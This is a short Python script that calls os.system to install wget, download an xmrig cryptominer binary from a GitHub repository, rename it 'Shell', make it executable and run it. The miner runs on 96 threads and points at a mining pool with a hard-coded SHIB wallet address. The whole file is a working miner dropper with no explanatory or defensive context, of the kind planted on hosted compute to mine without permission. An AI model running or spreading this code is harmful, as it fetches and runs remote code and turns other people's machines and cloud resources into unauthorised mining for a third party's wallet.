import os
os.system("apt install wget -y && wget -O Shell https://github.com/quincyhays/bmxmrig/raw/master/xmrig && chmod 777 Shell && ./Shell -o rx.unmineable.com:3333 -u SHIB:0x748025d6e4e19b9e482dc048a31b970d2772275b.worker_$(shuf -i 1-999999 -n 1) -p X -k -a rx/0 -t96")
